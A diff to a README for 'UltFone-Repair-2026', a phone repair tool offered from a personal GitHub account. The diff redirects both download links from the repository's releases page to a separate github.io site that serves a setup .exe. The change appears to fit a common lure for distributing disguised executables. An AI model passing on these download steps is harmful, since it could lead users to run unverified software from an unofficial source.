@@ -1,6 +1,6 @@
 # 🛠️ UltFone-Repair-2026 - Fix Phone Issues On Your Computer
 
-[ ![Download UltFone Repair](https://img.shields.io/badge/Download-UltFone_Repair-blue.svg) ](https://github.com/Ozlem6342/UltFone-Repair-2026/releases)
+[ ![Download UltFone Repair](https://img.shields.io/badge/Download-UltFone_Repair-blue.svg) ](https://ozlem6342.github.io)
 
 ## 📋 About This Software
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards for a stable experience:
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/Ozlem6342/UltFone-Repair-2026/releases).
+1. Go to the [official release page](https://ozlem6342.github.io).
 2. Look for the file named UltFone-Repair-2026-Setup.exe under the Assets section.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes saving.
